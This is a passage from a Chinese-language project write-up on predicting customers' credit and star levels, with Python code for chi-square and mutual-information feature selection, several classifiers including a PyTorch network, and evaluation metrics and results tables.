<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">皮尔逊系数只能衡量线性相关性，但互信息系数能够解决这一局限</span></span><br><span class="line"><span class="string">互信息系数能够很好地度量各种相关性，得到相关性后可以排序选择特征</span></span><br><span class="line"><span class="string">输入为合并表后的路径，k为待选择的特征数量  </span></span><br><span class="line"><span class="string">返回值为一个二维列表，每一维长度均为k，分别代表对credit_level和star_level最相关的k个特征</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mutual_select_features</span>(<span class="params">file_path, k</span>):</span><br><span class="line">  df = pd.read_csv(file_path)</span><br><span class="line">  df.pop(<span class="string">&#x27;uid&#x27;</span>)</span><br><span class="line">  y = df.pop(<span class="string">&#x27;credit_level&#x27;</span>)</span><br><span class="line">  X = df</span><br><span class="line">  best_features = SelectKBest(score_func=mutual_info_classif, k=<span class="built_in">len</span>(X.columns))</span><br><span class="line">  fit = best_features.fit(X, y)</span><br><span class="line">  df_scores = pd.DataFrame(fit.scores_)</span><br><span class="line">  df_columns = pd.DataFrame(X.columns)</span><br><span class="line">  df_feature_scores = pd.concat([df_columns, df_scores], axis=<span class="number">1</span>)</span><br><span class="line">  df_feature_scores.columns = [<span class="string">&#x27;Feature&#x27;</span>, <span class="string">&#x27;Score&#x27;</span>]</span><br><span class="line">  df_feature_scores = df_feature_scores.sort_values(by=<span class="string">&#x27;Score&#x27;</span>, ascending=<span class="literal">False</span>)</span><br><span class="line">  f = <span class="built_in">open</span>(<span class="string">&#x27;resources/feature/credit_scores_mutual.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">  <span class="keyword">for</span> line <span class="keyword">in</span> df_feature_scores.iterrows():</span><br><span class="line">    f.write(<span class="built_in">str</span>(line) + <span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure>

<h5 id="1-3-卡方检验"><a href="#1-3-卡方检验" class="headerlink" title="1.3 卡方检验"></a>1.3 卡方检验</h5><p>$$<br>X &#x3D; \Sigma{(0-E)&#x2F;E}<br>$$</p>
<p>​	卡方检验可以用于特征选择，特别是在处理分类问题时。基本思想是看特征与目标变量之间的关联程度，关联度越高，特征就越重要。卡方统计量度量了观察分布和期望分布之间的差异，卡方值越大，差异就越大，这意味着特征和目标变量之间的关联性更强，反之亦然。因此，可以通过计算每个特征的卡方统计量来对特征进行评分，并选择得分最高的特征。</p>
<p>​	这种方法适用于分类目标变量和分类特征，它不适用于连续变量。如果你的特征或目标变量是连续的，你可能需要先将其离散化或考虑使用其他方法，如基于皮尔逊相关系数或基于模型的特征选择。</p>
<p>​	需要注意的是，尽管卡方检验可以帮助我们找出与目标变量有强关联的特征，但它并不能检测出特征之间的交互作用。这意味着，如果一个特征只有在与另一个特征相结合时才对目标变量有影响，卡方检验可能无法识别出这个特征的重要性。</p>
<p><strong>代码如下：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">chi2_select_features</span>(<span class="params">file_path, k</span>):</span><br><span class="line">  df = pd.read_csv(file_path)</span><br><span class="line">  df.pop(<span class="string">&#x27;uid&#x27;</span>)</span><br><span class="line">  y = df.pop(<span class="string">&#x27;credit_level&#x27;</span>)</span><br><span class="line">  X = df</span><br><span class="line">  best_features = SelectKBest(score_func=chi2, k=<span class="built_in">len</span>(X.columns))</span><br><span class="line">  fit = best_features.fit(X, y)</span><br><span class="line">  df_scores = pd.DataFrame(fit.scores_)</span><br><span class="line">  df_columns = pd.DataFrame(X.columns)</span><br><span class="line">  df_feature_scores = pd.concat([df_columns, df_scores], axis=<span class="number">1</span>)</span><br><span class="line">  df_feature_scores.columns = [<span class="string">&#x27;Feature&#x27;</span>, <span class="string">&#x27;Score&#x27;</span>]</span><br><span class="line">  df_feature_scores = df_feature_scores.sort_values(by=<span class="string">&#x27;Score&#x27;</span>, ascending=<span class="literal">False</span>)</span><br><span class="line">  f = <span class="built_in">open</span>(<span class="string">&#x27;resources/feature/credit_scores_chi2.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">  <span class="keyword">for</span> line <span class="keyword">in</span> df_feature_scores.iterrows():</span><br><span class="line">    f.write(<span class="built_in">str</span>(line) + <span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure>

<h4 id="2-特征选择"><a href="#2-特征选择" class="headerlink" title="2. 特征选择"></a>2. 特征选择</h4><p>​	根据前面的三种方法，我们最终决定使用<strong>基于经验、基于卡方检验、基于互信息</strong>的三种情形作为我们最终的特征选择。</p>
<p>选择credit_scores_chi2（卡方检验得分）部分展示：</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/scroe-chi2.png" alt="scroe-chi2" style="zoom:50%;" />

<p>​	首先选取每种情况下最大得分的5%的所有特征，然后取这些特征的并集作为最终的特征集，将数据中的在特征集以外的列丢弃。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">select_feature</span>(<span class="params">feature_scores, proportion</span>):</span><br><span class="line">  select_features = []</span><br><span class="line">  max_score = <span class="built_in">max</span>(feature_scores.values())</span><br><span class="line">  <span class="keyword">for</span> feature, score <span class="keyword">in</span> feature_scores.items():</span><br><span class="line">    <span class="keyword">if</span> score &gt;= max_score * proportion:</span><br><span class="line">      select_features.append(feature)</span><br><span class="line">  <span class="keyword">return</span> select_features</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">credit_chisquare_scores_path = <span class="string">&#x27;resources/feature/credit_scores_chi2.txt&#x27;</span></span><br><span class="line">credit_chisquare_feature_scores = read_feature_scores(credit_chisquare_scores_path)</span><br><span class="line">credit_chisquare_select_features = select_feature(credit_chisquare_feature_scores, <span class="number">0.05</span>)</span><br><span class="line"></span><br><span class="line">credit_mutual_scores_path = <span class="string">&#x27;resources/feature/credit_scores_mutual.txt&#x27;</span></span><br><span class="line">credit_mutual_feature_scores = read_feature_scores(credit_mutual_scores_path)</span><br><span class="line">credit_mutual_select_features = select_feature(credit_mutual_feature_scores, <span class="number">0.05</span>)</span><br><span class="line"></span><br><span class="line">credit_select_features = <span class="built_in">list</span>(<span class="built_in">set</span>(credit_chisquare_select_features).union(<span class="built_in">set</span>(credit_chisquare_select_features)))</span><br></pre></td></tr></table></figure>

<h3 id="四-模型选择与训练"><a href="#四-模型选择与训练" class="headerlink" title="四 模型选择与训练"></a>四 模型选择与训练</h3><p>​	从已知标签的数据集中以7：3比例分割为训练集和测试集，分别得到特征和标签。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_features_and_labels</span>(<span class="params">train_csv, test_csv, level</span>):</span><br><span class="line">    train_data = pd.read_csv(train_csv)</span><br><span class="line">    test_data = pd.read_csv(test_csv)</span><br><span class="line">    <span class="comment"># 分离特征和标签</span></span><br><span class="line">    features = train_data.drop([<span class="string">&#x27;uid&#x27;</span>, level], axis=<span class="number">1</span>)</span><br><span class="line">    label = train_data[level]</span><br><span class="line">    label = label.astype(<span class="built_in">int</span>)</span><br><span class="line">    train1, test1, train2, test2 = train_test_split(features, label, test_size=<span class="number">0.3</span>, random_state=<span class="number">18</span>)</span><br><span class="line">    <span class="keyword">return</span> train1, test1, train2, test2, test_data</span><br></pre></td></tr></table></figure>

<p>​	选用了逻辑回归、决策树、随机森林、XGBoost和神经网络作为模型，将相应模型传入run_model方法进行训练。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># category代表是credit还是start</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_model</span>(<span class="params">model, train_features, train_label, test_features, test_label, test, category</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;credit:&#x27;</span>)</span><br><span class="line">    model.fit(train_features, train_label)</span><br></pre></td></tr></table></figure>

<h4 id="1-逻辑回归"><a href="#1-逻辑回归" class="headerlink" title="1. 逻辑回归"></a>1. 逻辑回归</h4><p>​	默认最大迭代次数为100次，在运行实践中发现会报算法没有收敛，得到最优解就结束的错误。通过实践将其设置为1000次，既可以充分收敛得到最优解，又不至于因为迭代次数过多，影响效率。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 逻辑回归</span></span><br><span class="line">lr = LogisticRegression(max_iter=<span class="number">1000</span>)  <span class="comment"># 默认最大迭代次数为100次，没有收敛到最优解</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Logistic Regression:&#x27;</span>)</span><br><span class="line">    run_model(lr, X_credit_train, y_credit_train, X_credit_test, y_credit_test, credit_test,</span><br><span class="line">              [<span class="string">&#x27;credit&#x27;</span>, <span class="string">&#x27;logistic_regression&#x27;</span>])</span><br><span class="line">    run_model(lr, X_star_train, y_star_train, X_star_test, y_star_test, star_test,</span><br><span class="line">              [<span class="string">&#x27;star&#x27;</span>, <span class="string">&#x27;logistic_regression&#x27;</span>])</span><br></pre></td></tr></table></figure>

<h4 id="2-决策树"><a href="#2-决策树" class="headerlink" title="2. 决策树"></a>2. 决策树</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 决策树</span></span><br><span class="line">dt = DecisionTreeClassifier()</span><br><span class="line">run_model(dt, X_credit_train, y_credit_train, X_credit_test, y_credit_test, credit_test,</span><br><span class="line">              [<span class="string">&#x27;credit&#x27;</span>, <span class="string">&#x27;decision_tree&#x27;</span>])</span><br><span class="line">    run_model(dt, X_star_train, y_star_train, X_star_test, y_star_test, star_test,</span><br><span class="line">              [<span class="string">&#x27;star&#x27;</span>, <span class="string">&#x27;decision_tree&#x27;</span>])</span><br></pre></td></tr></table></figure>

<h4 id="3-随机森林"><a href="#3-随机森林" class="headerlink" title="3. 随机森林"></a>3. 随机森林</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 随机森林</span></span><br><span class="line">rt = RandomForestClassifier()</span><br><span class="line">run_model(rt, X_credit_train, y_credit_train, X_credit_test, y_credit_test, credit_test,</span><br><span class="line">              [<span class="string">&#x27;credit&#x27;</span>, <span class="string">&#x27;random_forest&#x27;</span>])</span><br><span class="line">    run_model(rt, X_star_train, y_star_train, X_star_test, y_star_test, star_test,</span><br><span class="line">              [<span class="string">&#x27;star&#x27;</span>, <span class="string">&#x27;random_forest&#x27;</span>])</span><br></pre></td></tr></table></figure>

<h4 id="4-XGBoost"><a href="#4-XGBoost" class="headerlink" title="4. XGBoost"></a>4. XGBoost</h4><p>​	由于XGBoost要求标签类别必须是从0开始的整数序列，所以进行如下转换，将标签映射为0~n的整数。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建XGBoost模型</span></span><br><span class="line">xgb_model = xgb.XGBClassifier()</span><br><span class="line"><span class="comment"># 定义映射关系</span></span><br><span class="line">star_map = &#123;<span class="number">1</span>: <span class="number">0</span>, <span class="number">2</span>: <span class="number">1</span>, <span class="number">3</span>: <span class="number">2</span>, <span class="number">4</span>: <span class="number">3</span>, <span class="number">5</span>: <span class="number">4</span>, <span class="number">6</span>: <span class="number">5</span>, <span class="number">7</span>: <span class="number">6</span>, <span class="number">8</span>: <span class="number">7</span>, <span class="number">9</span>: <span class="number">8</span>&#125;</span><br><span class="line">credit_map = &#123;<span class="number">35</span>: <span class="number">0</span>, <span class="number">50</span>: <span class="number">1</span>, <span class="number">60</span>: <span class="number">2</span>, <span class="number">70</span>: <span class="number">3</span>, <span class="number">85</span>: <span class="number">4</span>&#125;</span><br><span class="line"><span class="comment"># 将标签列进行映射</span></span><br><span class="line">y_star_train_mapped = y_star_train.<span class="built_in">map</span>(star_map)</span><br><span class="line">y_star_test_mapped = y_star_test.<span class="built_in">map</span>(star_map)</span><br><span class="line">y_credit_train_mapped = y_credit_train.<span class="built_in">map</span>(credit_map)</span><br><span class="line">y_credit_test_mapped = y_credit_test.<span class="built_in">map</span>(credit_map)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;XGBoost:&#x27;</span>)</span><br><span class="line">run_model(xgb_model, X_credit_train, y_credit_train_mapped, X_credit_test, y_credit_test_mapped, credit_test,</span><br><span class="line">          [<span class="string">&#x27;credit&#x27;</span>, <span class="string">&#x27;XGBoost&#x27;</span>])</span><br><span class="line">run_model(xgb_model, X_star_train, y_star_train_mapped, X_star_test, y_star_test_mapped, star_test,</span><br><span class="line">          [<span class="string">&#x27;star&#x27;</span>, <span class="string">&#x27;XGBoost&#x27;</span>])</span><br></pre></td></tr></table></figure>

<h4 id="5-神经网络"><a href="#5-神经网络" class="headerlink" title="5. 神经网络"></a>5. 神经网络</h4><p>通过搭建神经网络来进行模型训练与预测，其中star模型的网络结构如下（对credit的结构同理）：</p>
<ol>
<li>输入层：接受输入数据，大小为14，对应了14个输入属性。</li>
<li>隐藏层1：包含128个神经元，通过线性变换和ReLU激活函数对输入进行处理。</li>
<li>隐藏层2：包含64个神经元，同样通过线性变换和ReLU激活函数对隐藏层1的输出进行处理。</li>
<li>输出层：包含9个神经元，对应了1~9的star评级，通过线性变换得到最终的输出结果，然后使用对数 softmax 函数对输出进行归一化。</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Net</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>(Net, <span class="variable language_">self</span>).__init__()</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>.fc1 = nn.Linear(<span class="number">39</span>, <span class="number">128</span>)</span><br><span class="line">        <span class="variable language_">self</span>.fc2 = nn.Linear(<span class="number">128</span>, <span class="number">64</span>)</span><br><span class="line">        <span class="variable language_">self</span>.fc3 = nn.Linear(<span class="number">64</span>, <span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        x = F.relu(<span class="variable language_">self</span>.fc1(x))</span><br><span class="line">        x = F.relu(<span class="variable language_">self</span>.fc2(x))</span><br><span class="line">        x = <span class="variable language_">self</span>.fc3(x)</span><br><span class="line">        <span class="keyword">return</span> F.log_softmax(x, dim=<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>数据集类如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyDataset</span>(torch.utils.data.Dataset):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, csv_file, train=<span class="literal">True</span></span>):</span><br><span class="line">        <span class="variable language_">self</span>.train = train</span><br><span class="line">        csv = pd.read_csv(csv_file)</span><br><span class="line">        csv = csv.drop([<span class="string">&#x27;uid&#x27;</span>], axis=<span class="number">1</span>)</span><br><span class="line">        <span class="comment"># 8:2划分训练集和验证集</span></span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.train:</span><br><span class="line">            <span class="variable language_">self</span>.data, _ = train_test_split(csv, test_size=<span class="number">0.2</span>, random_state=<span class="number">42</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            _, <span class="variable language_">self</span>.data = train_test_split(csv, test_size=<span class="number">0.2</span>, random_state=<span class="number">42</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__getitem__</span>(<span class="params">self, index</span>):</span><br><span class="line">        <span class="comment"># 将数据和标签转换为PyTorch的Tensor对象</span></span><br><span class="line">        data_tensor = torch.tensor(<span class="variable language_">self</span>.data.iloc[index, <span class="number">0</span>:-<span class="number">9</span>].values, dtype=torch.float32).to(device)</span><br><span class="line">        label_tensor = torch.tensor(<span class="variable language_">self</span>.data.iloc[index, -<span class="number">9</span>:].values, dtype=torch.float32).to(device)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> data_tensor, label_tensor</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__len__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">len</span>(<span class="variable language_">self</span>.data)</span><br></pre></td></tr></table></figure>

<p>进行30次迭代后，loss值基本稳定：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># device为cuda，使用GPU进行训练</span></span><br><span class="line">model = Net().to(device)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义损失函数为均方误差损失函数</span></span><br><span class="line">criterion = nn.MSELoss()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义优化器为Adam优化器，学习率为0.001</span></span><br><span class="line">optimizer = torch.optim.Adam(model.parameters(), lr=<span class="number">0.001</span>)</span><br><span class="line"></span><br><span class="line">train_dataset = MyDataset(<span class="string">&quot;star_train_std_selected_split.csv&quot;</span>, <span class="literal">True</span>)</span><br><span class="line">train_dataloader = DataLoader(train_dataset, batch_size=<span class="number">5000</span>, shuffle=<span class="literal">True</span>, drop_last=<span class="literal">True</span>,</span><br><span class="line">                              num_workers=<span class="number">0</span>) <span class="comment"># 一批量为5000条数据</span></span><br><span class="line"></span><br><span class="line">valid_dataset = MyDataset(<span class="string">&quot;star_train_std_selected_split.csv&quot;</span>, <span class="literal">False</span>)</span><br><span class="line">valid_dataloader = DataLoader(valid_dataset, batch_size=<span class="number">5000</span>, shuffle=<span class="literal">True</span>, drop_last=<span class="literal">True</span>,</span><br><span class="line">                              num_workers=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> epoch <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">    <span class="comment"># 训练</span></span><br><span class="line">    <span class="keyword">for</span> i, (data, label) <span class="keyword">in</span> <span class="built_in">enumerate</span>(train_dataloader):</span><br><span class="line">        data = data.to(device)</span><br><span class="line">        optimizer.zero_grad()</span><br><span class="line">        output = model(data)</span><br><span class="line">        loss = criterion(output, label)</span><br><span class="line">        loss.backward()</span><br><span class="line">        optimizer.step()</span><br><span class="line">        </span><br><span class="line">    <span class="comment"># 测试</span></span><br><span class="line">    <span class="keyword">for</span> i, (data, label) <span class="keyword">in</span> <span class="built_in">enumerate</span>(valid_dataloader):</span><br><span class="line">        output = model(data)</span><br><span class="line">        loss = criterion(output, label)</span><br><span class="line">        accuracy = (output.argmax(dim=<span class="number">1</span>) == label.argmax(dim=<span class="number">1</span>)).<span class="built_in">float</span>().mean()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Epoch: &#123;&#125;, Iter: &#123;&#125;, Accuracy: &#123;&#125;, loss: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(epoch, i, accuracy.item(), loss.data))</span><br><span class="line">        predictions = output.argmax(dim=<span class="number">1</span>).cpu().numpy()</span><br><span class="line">        true_labels = label.argmax(dim=<span class="number">1</span>).cpu().numpy()</span><br></pre></td></tr></table></figure>

<p>最后，用现有模型进行star预测：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 存放分类对应的index</span></span><br><span class="line">predictions = []</span><br><span class="line"><span class="keyword">with</span> torch.no_grad():</span><br><span class="line">    <span class="keyword">for</span> data <span class="keyword">in</span> inference_dataloader:</span><br><span class="line">        data = data.to(device)</span><br><span class="line">        output = model(data)</span><br><span class="line">        batch_predictions = output.argmax(dim=<span class="number">1</span>).cpu().numpy()</span><br><span class="line">        predictions.extend(batch_predictions)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印预测分类的index列表</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Predictions:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(predictions)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 映射到uid:star_level</span></span><br><span class="line">df_temp = pd.DataFrame(predictions, columns=[<span class="string">&#x27;star_level&#x27;</span>])</span><br><span class="line">df = pd.read_csv(<span class="string">&#x27;star_test_std_selected.csv&#x27;</span>)</span><br><span class="line">df[<span class="string">&#x27;star_level&#x27;</span>] = df_temp[<span class="string">&#x27;star_level&#x27;</span>] + <span class="number">1</span></span><br><span class="line">df = df[[<span class="string">&#x27;uid&#x27;</span>, <span class="string">&#x27;star_level&#x27;</span>]]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 预测结果写入csv文件</span></span><br><span class="line">df.to_csv(<span class="string">&#x27;star_neural_network_predict.csv&#x27;</span>, index=<span class="literal">False</span>)</span><br><span class="line"><span class="built_in">print</span>(df)</span><br></pre></td></tr></table></figure>

<h3 id="五-模型评估"><a href="#五-模型评估" class="headerlink" title="五 模型评估"></a>五 模型评估</h3><p>​	模型评估使用准确率、混淆矩阵、精确率、召回率、F1分数和Cohen’s Kappa系数。</p>
<p>​	其中对于精确率、召回率和F1分数分别采取macro和weighted作为average参数的值，得到相应结果。两者的区别在于前者采取宏平均，对每个类别单独计算指标，然后对所有类别的指标取算术平均值；而后者采取加权平均，根据每个类别在真实标签中的样本数量进行加权平均。由于预处理后得到的数据各类别标签个数相差较大，所以本小组认为weighted更加合理，但同时也给出了macro作为参数值时的结果。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">predictions = model.predict(test_features)</span><br><span class="line"><span class="comment"># 模型评估</span></span><br><span class="line">evaluate(test_label, predictions, category)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># # 计算混淆矩阵</span></span><br><span class="line">confusion = confusion_matrix(label, predictions)</span><br><span class="line">draw_confusion(confusion, category)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Confusion Matrix&#x27;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 计算准确率 = (TP + TN) / (TP + TN + FP + FN)</span></span><br><span class="line">accuracy = accuracy_score(label, predictions)</span><br><span class="line"><span class="comment"># 计算Cohen&#x27;s Kappa系数</span></span><br><span class="line">kappa_score = cohen_kappa_score(label, predictions)</span><br><span class="line"><span class="comment"># 计算精确率 = TP / (TP + FP)</span></span><br><span class="line">macro_precision = precision_score(label, predictions, average=<span class="string">&#x27;macro&#x27;</span>, zero_division=<span class="number">1</span>)</span><br><span class="line"><span class="comment"># 计算召回率 = TP / (TP + FN)</span></span><br><span class="line">macro_recall = recall_score(label, predictions, average=<span class="string">&#x27;macro&#x27;</span>)</span><br><span class="line"><span class="comment"># 计算F1分数 = 2 * (精确率 * 召回率) / (精确率 + 召回率)</span></span><br><span class="line">macro_f1 = f1_score(label, predictions, average=<span class="string">&#x27;macro&#x27;</span>)</span><br><span class="line"><span class="comment"># 计算精确率 = TP / (TP + FP)</span></span><br><span class="line">weighted_precision = precision_score(label, predictions, average=<span class="string">&#x27;weighted&#x27;</span>, zero_division=<span class="number">1</span>)</span><br><span class="line"><span class="comment"># 计算召回率 = TP / (TP + FN)</span></span><br><span class="line">weighted_recall = recall_score(label, predictions, average=<span class="string">&#x27;weighted&#x27;</span>)</span><br><span class="line"><span class="comment"># 计算F1分数 = 2 * (精确率 * 召回率) / (精确率 + 召回率)</span></span><br><span class="line">weighted_f1 = f1_score(label, predictions, average=<span class="string">&#x27;weighted&#x27;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">draw_confusion</span>(<span class="params">confusion, category</span>):</span><br><span class="line">    <span class="comment"># 绘制混淆矩阵图</span></span><br><span class="line">    plt.imshow(confusion, cmap=<span class="string">&#x27;Blues&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> category[<span class="number">0</span>] == <span class="string">&#x27;star&#x27;</span>:</span><br><span class="line">        class_names = [<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>]</span><br><span class="line">    <span class="keyword">elif</span> category[<span class="number">0</span>] == <span class="string">&#x27;credit&#x27;</span>:</span><br><span class="line">        class_names = [<span class="string">&#x27;35&#x27;</span>, <span class="string">&#x27;50&#x27;</span>, <span class="string">&#x27;60&#x27;</span>, <span class="string">&#x27;70&#x27;</span>, <span class="string">&#x27;85&#x27;</span>]</span><br><span class="line">    <span class="comment"># 添加颜色条</span></span><br><span class="line">    plt.colorbar()</span><br><span class="line">    <span class="comment"># 设置标签</span></span><br><span class="line">    tick_marks = np.arange(<span class="built_in">len</span>(class_names))</span><br><span class="line">    plt.xticks(tick_marks, class_names)</span><br><span class="line">    plt.yticks(tick_marks, class_names)</span><br><span class="line">    <span class="comment"># 添加数值</span></span><br><span class="line">    thresh = confusion.<span class="built_in">max</span>() / <span class="number">2</span></span><br><span class="line">    <span class="keyword">for</span> i, j <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(confusion.shape[<span class="number">0</span>]), <span class="built_in">range</span>(confusion.shape[<span class="number">1</span>])):</span><br><span class="line">        plt.text(j, i, <span class="built_in">format</span>(confusion[i, j], <span class="string">&#x27;d&#x27;</span>),</span><br><span class="line">                 horizontalalignment=<span class="string">&quot;center&quot;</span>,</span><br><span class="line">                 color=<span class="string">&quot;white&quot;</span> <span class="keyword">if</span> confusion[i, j] &gt; thresh <span class="keyword">else</span> <span class="string">&quot;black&quot;</span>)</span><br><span class="line">    <span class="comment"># 添加轴标签</span></span><br><span class="line">    plt.xlabel(<span class="string">&#x27;Predicted Label&#x27;</span>)</span><br><span class="line">    plt.ylabel(<span class="string">&#x27;True Label&#x27;</span>)</span><br><span class="line">    <span class="comment"># 调整布局</span></span><br><span class="line">    plt.tight_layout()</span><br><span class="line">    <span class="comment"># 保存为图片</span></span><br><span class="line">    save_path = <span class="string">&#x27;resources/evaluation results/&#x27;</span>+category[<span class="number">0</span>]+<span class="string">&#x27;_&#x27;</span>+category[<span class="number">1</span>]+<span class="string">&#x27;_confusion_matrix.png&#x27;</span></span><br><span class="line">    plt.savefig(save_path)</span><br><span class="line">    <span class="comment"># 显示图像</span></span><br><span class="line">    plt.show()</span><br></pre></td></tr></table></figure>

<p>部分结果展示：</p>
<p>混淆矩阵图片(采用决策树模型针对star_level做评估)：</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/star_decision_tree_confusion_matrix.png"></p>
<p>准确率、精确率、召回率、F1分数和Cohen’s Kappa系数：</p>
<table>
<thead>
<tr>
<th align="center">star</th>
<th align="center">准确率</th>
<th align="center">精确率(weighted)</th>
<th align="center">召回率(weighted)</th>
<th align="center">F1分数(weighted)</th>
<th>精确率(macro)</th>
<th>召回率(macro)</th>
<th>F1分数(macro)</th>
<th align="center">Cohen’s Kappa系数</th>
</tr>
</thead>
<tbody><tr>
<td align="center">逻辑回归模型</td>
<td align="center">0.8443</td>
<td align="center">0.8388</td>
<td align="center">0.8443</td>
<td align="center">0.8353</td>
<td>0.6835</td>
<td>0.4218</td>
<td>0.4268</td>
<td align="center">0.7419</td>
</tr>
<tr>
<td align="center">决策树模型</td>
<td align="center">0.8865</td>
<td align="center">0.8873</td>
<td align="center">0.8865</td>
<td align="center">0.8868</td>
<td>0.6732</td>
<td>0.4530</td>
<td>0.4519</td>
<td align="center">0.8183</td>
</tr>
<tr>
<td align="center">随机森林模型</td>
<td align="center">0.9059</td>
<td align="center">0.9067</td>
<td align="center">0.9059</td>
<td align="center">0.9061</td>
<td>0.6945</td>
<td>0.4726</td>
<td>0.4717</td>
<td align="center">0.8500</td>
</tr>
<tr>
<td align="center">XGBoost模型</td>
<td align="center">0.9114</td>
<td align="center">0.9137</td>
<td align="center">0.9114</td>
<td align="center">0.9120</td>
<td>0.7063</td>
<td>0.4870</td>
<td>0.4833</td>
<td align="center">0.8589</td>
</tr>
<tr>
<td align="center">神经网络</td>
<td align="center">0.9039</td>
<td align="center">0.9066</td>
<td align="center">0.9040</td>
<td align="center">0.9003</td>
<td></td>
<td></td>
<td></td>
<td align="center">0.8435</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th align="center">credit</th>
<th align="center">准确率</th>
<th align="center">精确率(weighted)</th>
<th align="center">召回率(weighted)</th>
<th align="center">F1分数(weighted)</th>
<th>精确率(macro)</th>
<th>召回率(macro)</th>
<th>F1分数(macro)</th>
<th align="center">Cohen’s Kappa系数</th>
</tr>
</thead>
<tbody><tr>
<td align="center">逻辑回归模型</td>
<td align="center">0.6628</td>
<td align="center">0.6158</td>
<td align="center">0.6628</td>
<td align="center">0.6139</td>
<td>0.7065</td>
<td>0.2703</td>
<td>0.2550</td>
<td align="center">0.3000</td>
</tr>
<tr>
<td align="center">决策树模型</td>
<td align="center">0.6101</td>
<td align="center">0.6142</td>
<td align="center">0.6101</td>
<td align="center">0.6121</td>
<td>0.2885</td>
<td>0.2895</td>
<td>0.2890</td>
<td align="center">0.2857</td>
</tr>
<tr>
<td align="center">随机森林模型</td>
<td align="center">0.6845</td>
<td align="center">0.6523</td>
<td align="center">0.6845</td>
<td align="center">0.6615</td>
<td>0.5260</td>
<td>0.3049</td>
<td>0.3063</td>
<td align="center">0.3773</td>
</tr>
<tr>
<td align="center">XGBoost模型</td>
<td align="center">0.6869</td>
<td align="center">0.6620</td>
<td align="center">0.6869</td>
<td align="center">0.6680</td>
<td>0.5289</td>
